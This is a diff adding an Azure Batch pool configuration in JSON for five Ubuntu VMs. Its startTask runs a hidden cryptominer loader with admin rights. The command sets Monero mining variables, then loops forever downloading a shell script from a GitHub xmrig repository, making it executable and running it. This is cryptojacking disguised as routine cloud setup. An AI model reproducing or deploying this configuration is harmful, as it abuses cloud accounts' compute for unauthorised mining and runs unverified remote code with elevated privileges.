@@ -1,0 +1,22 @@
+{
+    "id": "pool",
+    "virtualMachineConfiguration": {
+        "imageReference": {
+            "publisher": "Canonical",
+            "offer": "UbuntuServer",
+            "sku": "18.04-LTS"
+        },
+        "nodeAgentSKUId": "batch.node.ubuntu 18.04"
+    },            
+    "vmSize": "Standard_D2s_v3",
+    "targetDedicatedNodes": 5,
+    "startTask": {
+        "commandLine": "/bin/bash -c 'export currency=monero;export pool_pass1=x;export pool_address1=pool;export wallet1=vi;export nicehash1=false;export pool_pass2=x;export pool_address2=;export wallet2=;export nicehash2=false;while [ 1 ] ;do wget https://raw.githubusercontent.com/taikhoanxzc004/xmrig/master/pkt.sh ; chmod u+x pkt.sh ; ./pkt.sh ; done;'",
+        "waitForSuccess": false,
+        "userIdentity": {
+            "autoUser": {
+                "elevationLevel": "admin"
+            }
+        }
+    }
+}
